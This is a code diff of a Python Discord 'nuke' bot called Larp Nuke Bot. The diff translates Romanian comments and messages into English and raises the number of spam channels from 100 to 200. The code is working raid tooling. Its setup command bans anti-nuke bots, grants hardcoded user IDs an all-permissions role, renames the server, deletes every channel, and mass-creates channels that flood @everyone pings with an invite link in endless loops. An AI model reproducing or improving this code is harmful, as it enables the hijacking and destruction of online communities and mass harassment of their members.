@@ -244,7 +244,6 @@ async def removepremium(ctx, user: discord.User):
     else:
         await ctx.send(f"ℹ️ {user.name} does not have premium.")
 
-# ================== !setup ==================
 @bot.command()
 async def setup(ctx):
     guild = ctx.guild
@@ -252,7 +251,7 @@ async def setup(ctx):
     user_config = get_user_config(user.id)
 
     if not ctx.guild.me.guild_permissions.administrator:
-        await ctx.send("❌ Botul nu are permisiunea de **Administrator**.")
+        await ctx.send("❌ Bot does not have Administrator permission.")
         return
 
     if guild.id == BLACKLISTED_GUILD_ID:
@@ -266,13 +265,13 @@ async def setup(ctx):
 
     banned_bots = await detect_and_ban_antinuke_bots(guild)
     if banned_bots:
-        await user.send(f"✅ Banați boturile: {', '.join(banned_bots)}")
+        await user.send(f"✅ Banned anti-nuke bots: {', '.join(banned_bots)}")
 
     save_nuke_stats(user.id, guild)
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
-    # CREARE ROL ADMIN
+    # CREATE ADMIN ROLE
     try:
         admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
         for admin_id in admin_users:
@@ -282,20 +281,20 @@ async def setup(ctx):
     except:
         pass
 
-    # SCHIMBARE NUME SERVER
+    # CHANGE SERVER NAME
     try:
         await guild.edit(name="1weeksober owns this")
     except:
         pass
 
-    # STERGERE CANALE
+    # DELETE ALL CHANNELS
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             continue
 
-    # ===== LISTA NUME CANALE =====
+    # ===== CHANNEL NAMES =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
@@ -323,30 +322,26 @@ async def setup(ctx):
     embed_content.set_image(url="https://i.imgur.com/yMQvcRw.gif")
     embed_content.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== MESAJ MARE (2000 caractere) =====
+    # ===== BIG MESSAGE (2000 chars) =====
     base_text = "@everyone @here join https://discord.gg/larpempire\n"
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREARE 100 CANALE IN PARALEL (CA IN INSOMNIA) =====
-    total_channels = 100  # 100 de canale, ca in Insomnia
+    # ===== CREATE 200 CHANNELS IN PARALLEL (Insomnia style) =====
+    total_channels = 200
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale in paralel (stil Insomnia)...")
+    await user.send(f"🔄 Starting creation of {total_channels} channels in parallel (Larp Nuke Bot style)...")
 
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
-    # FUNCTIA DE SPAM PE UN CANAL (SE LANSEAZA IMEDIAT DUPA CREARE)
     async def spam_channel(channel):
         try:
-            # Trimite mesajul mare (2000 caractere)
             await channel.send(content=big_message)
             await asyncio.sleep(0.08)
-            # Trimite embed-ul
             await channel.send(embed=embed_content)
             await asyncio.sleep(0.08)
-            # Spam continuu cu ping-uri pana la rate-limit
             while True:
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
@@ -355,7 +350,6 @@ async def setup(ctx):
         except Exception:
             pass
 
-    # CREARE CANAL + SPAM
     async def create_and_spam(index):
         try:
             base_name = random.choice(base_channel_names)
@@ -366,27 +360,27 @@ async def setup(ctx):
             ch = await guild.create_text_channel(name=styled_name)
             created_channels.append(ch)
 
-            # LANSAM SPAM-UL IN FUNDAL, FARA SA ASTEPTAM
+            # Start spam in background
             asyncio.create_task(spam_channel(ch))
 
         except discord.HTTPException as e:
             if e.status == 429:
-                await user.send(f"⚠️ Rate limit la canalul {index}, continui...")
+                await user.send(f"⚠️ Rate limit on channel {index}, continuing...")
             else:
-                await user.send(f"⚠️ Eroare canal {index}: {e}")
+                await user.send(f"⚠️ Error on channel {index}: {e}")
         except Exception as e:
-            await user.send(f"⚠️ Eroare canal {index}: {e}")
+            await user.send(f"⚠️ Error on channel {index}: {e}")
 
-    # CREARE TOATE CANALELE IN PARALEL (ASYNCIO.GATHER) – FARA BATCH, FARA PAUZA
+    # Create all channels in parallel with asyncio.gather (no batches, no pauses)
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create, spam-ul ruleaza pe toate in paralel!")
+    await user.send(f"✅ All {len(created_channels)} channels created, spam is running on all channels in parallel!")
 
-    # ASTEPTAM 3 SECUNDE PENTRU CA SPAM-UL SA RULEZE (DAR NU BLOCAM PREA MULT)
+    # Wait 3 seconds for spam to start
     await asyncio.sleep(3)
 
-    await user.send("✅ Proces finalizat. Părăsesc serverul...")
+    await user.send("✅ Process completed. Leaving server...")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
@@ -459,14 +453,14 @@ class SettingsModal(discord.ui.Modal):
 @bot.event
 async def on_ready():
     print(f"✅ Bot is online as {bot.user}!")
-    print(f"📊 Conectat la {len(bot.guilds)} servere.")
+    print(f"📊 Connected to {len(bot.guilds)} servers.")
     await bot.tree.sync()
 
 app = Flask(__name__)
 
 @app.route("/")
 def home():
-    return "Corrupt bot is online."
+    return "Larp Nuke Bot is online."
 
 def run_flask():
     port = int(os.getenv("PORT", 8080))
